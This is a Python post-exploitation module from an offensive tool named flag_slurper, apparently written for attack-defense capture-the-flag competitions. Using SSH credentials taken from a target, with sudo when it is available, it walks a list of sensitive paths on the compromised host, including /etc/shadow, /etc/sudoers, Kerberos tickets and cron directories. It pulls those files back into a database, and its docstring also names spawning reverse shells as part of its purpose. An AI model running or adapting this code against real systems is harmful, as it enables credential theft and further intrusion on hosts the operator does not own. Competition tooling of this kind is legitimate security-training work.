"""
Tasks to do after checking/retrieving flags.

These functions **MUST NOT** bubble exceptions. A post
task failing does not mean the protocol has failed,
just any of the fun stuff you want to do afterwards.

Things that belong here:
- grabbing fun (non-flag) files
- spawning reverse shells

Things that don't belong here:
- grabbing flags
"""
import logging
import os
from abc import ABC, abstractmethod
from collections import deque
from typing import Tuple

import paramiko
from schema import Schema, Optional

from flag_slurper.autolib import Service
from .exploit import get_directory, get_file, run_command, run_sudo, expand_wildcard
from .models import Credential, File

logger = logging.getLogger(__name__)

# Sensitive files to find on systems. Paths
# ending in / are directories.
SENSITIVE_FILES = [
    # Authentication
    '/etc/passwd',
    '/etc/shadow',
    '/etc/sudoers',
    '/etc/sudoers.d/',

    # Kerberos
    '/tmp/krb*',
    '/etc/krb*',
    '/etc/sssd/',

    # Cron
    '/etc/crontab',
    '/etc/cron.d/',
    '/etc/cron.daily/',
    '/etc/cron.hourly/',
    '/etc/cron.monthly/',
    '/etc/cron.weekly/',
]


def post_ssh(ssh: paramiko.SSHClient, credential: Credential):
    """
    Post tasks for SSH.

    :param ssh: The existing ssh connection
    :param credential: The credentials associated with this connection
    """

    # Stage 0 - Determine access level
    # If we have sudo access, we need to tell the various exploit
    # functions so they can use it.
    sudo = credential.bag.password if credential.sudo else None

    # Stage 1 - Sensitive Files

    def _get_file_info(path: str) -> Tuple[str, str]:
        name_cmd = 'file -b {}'.format(path)
        mime_cmd = 'file -i -b {}'.format(path)
        if sudo:
            _, stdout, _ = run_sudo(ssh, name_cmd, sudo)
            name = stdout.read().decode('utf-8').strip()
            _, stdout, _ = run_sudo(ssh, mime_cmd, sudo)
            mime = stdout.read().decode('utf-8').strip()
        else:
            name = run_command(ssh, name_cmd)
            mime = run_command(ssh, mime_cmd)
        return name, mime

    queue = deque(SENSITIVE_FILES)
    while len(queue):
        path = queue.pop()

        # Path is a directory
        if path[-1] == '/':
            directory = get_directory(ssh, path, sudo)
            if directory:
                queue.extend(map(lambda x: os.path.join(path, x.strip()), directory))

        # Path is a wildcard
        elif '*' in path:
            files = expand_wildcard(ssh, path, sudo)
            if files:
                queue.extend(map(lambda x: x.strip(), files))

        # Path should be a file
        else:
            if File.select().where(File.service == credential.service, File.path == path).count() >= 1:
                continue

            info = _get_file_info(path)
            contents = get_file(ssh, path, sudo)
            if contents:
                File.create(path=path, contents=contents, mime_type=info[1], info=info[0],
                            service=credential.service)
            else:
                logger.error("There was an error retrieving sensitive file %s: %s", path, contents)


class PostContext(dict):
    """
    A wrapper method for passing post pwn methods arbitrary data.

    This allows pwn functions to pass whatever arbitrary data they
    need onto the post plugins in an extensible way.
    """

    def validate(self, schema: dict) -> 'PostContext':
        """
        Allow a plugin to enforce their own schema for
        their context data. The ``Schema`` object is
        created by the context, not the plugin.

        :param schema: A dictionary containing the schema
        :return: Returns the context for chaining
        """
        Schema(schema, ignore_extra_keys=True).validate(self)
        return self


class PostPlugin(ABC):
    """
    Defines a post pwn plugin.

    Plugins are configured in the ``post`` key to a project. For example:

    .. code-block:: yaml

        ---
        _version: "0.1"
        ...
        post:
          - service: WWW SSH
            commands:
              - <post plugin name>:
                  <arguments>
    """

    name = None
    schema = None
    context_schema = None
    config = None

    def configure(self, config: dict) -> dict:
        """
        Configure the plugin.

        This provides the base configuration implementation. It
        simply just validates the schema against the given config.
        Plugins that need more involved configuration may override
        this method.

        Plugins must define their own schema by overriding the
        ``schema`` class variable.


        :param config:
        :return:
        """
        if not self.schema:
            raise ValueError('The schema for {} has not been configured'.format(self.name))
        config = Schema(self.schema).validate(config)
        return config

    @abstractmethod
    def run(self, context: PostContext):
        """
        Run the post pwn plugin.

        This is where the plugin will perform any actions it needs. All
        run methods MUST call their super before accessing the given
        context, otherwise it must attempt to safely access context
        entries.

        :param context: The context given to the post plugin
        """
        if not self.context_schema:
            raise ValueError('The config_schema for {} has not been configured'.format(self.name))
        context.validate(self.context_schema)

    @abstractmethod
    def predicate(self, service: Service, context: PostContext) -> bool:
        """
        Determines whether the plugin should be run for the given service,
        context, and configuration. The plugin's configuration will have
        been validated at this point.

        :param service: The current service to test against
        :param context: The current post context
        :return: True if this plugin should run, False otherwise
        """
        raise NotImplementedError


class SSHFileExfil(PostPlugin):
    name = 'ssh_exfil'
    schema = {
        Optional('files', default=[]): [str],
        Optional('merge_files', default=True): bool,
    }
    context_schema = {
        'ssh': paramiko.SSHClient,
        'credentials': Credential,
    }

    def run(self, context: PostContext):
        super().run(context)

    def predicate(self, service: Service, context: PostContext) -> bool:
        pass
